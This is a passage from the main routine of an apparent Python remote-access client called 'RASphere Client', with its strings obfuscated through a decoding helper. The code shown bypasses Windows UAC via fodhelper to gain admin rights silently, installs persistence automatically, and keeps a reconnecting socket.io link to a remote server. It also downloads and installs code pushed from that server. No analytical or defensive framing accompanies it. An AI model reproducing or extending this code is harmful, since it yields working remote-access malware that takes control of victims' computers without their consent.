        if _up(): print(_D("_s339"))
        else: print(_D("_s340"))
        return
    if args.install:
        if not url or not secret: print(_D("_s341")); sys.exit(1)
        if _ip(url, secret, rec, cid): print(_D("_s342"))
        else: print(_D("_s343"))
    if sys.platform == _D("_s344") and not getattr(args, "no_elevate", False) and not getattr(args, "elevated", False):
        if not _is_admin():
            _l.info(_D("_s345"))
            _fodhelper_uac_bypass(args)
            print(_D("_s346"))
        else:
            _l.info(_D("_s347"))
    if getattr(args, _D("_s348"), False):
        _l.info(_D("_s349"))
        _cleanup_uac_registry()
    if not args.no_persist and not args.uninstall:
        try:
            if url and secret:
                ok = _ip(url, secret, rec, cid)
                if ok: print(_D("_s350"))
                else: print(_D("_s351"))
        except Exception as e: print(f"[!] Auto-persist error: {e}")
    if not url: print(_D("_s352")); sys.exit(1)
    if not secret: print(_D("_s353")); sys.exit(1)
    _s.url = url.rstrip("/"); _s.secret = secret
    _s.cid = cid or f"{socket.gethostname()}-{os.urandom(3).hex()}"
    _l.info(f"RASphere Client | ID: {_s.cid} | Server: {_s.url}")
    sio = sio_lib.Client(reconnection=True, reconnection_attempts=0, reconnection_delay=rec,
                          reconnection_delay_max=30, _l=False, engineio_logger=False)
    _sh(sio); _s.sio = sio
    threading.Thread(target=_keepalive_pinger, args=(_s.url,), daemon=True).start()
    update_checked = False
    current_delay = rec  
    while True:
        try:
            _l.info(f"Connecting to {_s.url}...")
            sio.connect(_s.url, wait_timeout=10)
            _l.info(_D("_s354"))
            current_delay = rec
            if not update_checked:
                new_ver, dl_url = _check_for_update(_s.url)
                update_checked = True
                if new_ver and dl_url:
                    _l.info(f"New version {new_ver} available, applying update...")
                    ok = _download_and_install(dl_url, new_ver)
                    if ok:
                        _l.info(_D("_s355"))
                        sio.disconnect()
                        os._exit(0)
            sio.wait()
        except KeyboardInterrupt: _l.info(_D("_s356")); break
        except Exception as e:
            _l.error(f"Connection error: {e}")
            if not rec: break
            _l.info(f"Reconnecting in {current_delay}s...")
            time.sleep(current_delay)
            current_delay = min(current_delay * 2, _RECON_MAX)
    sio.disconnect(); _l.info(_D("_s357"))
if __name__ == _D("_s358"): main()
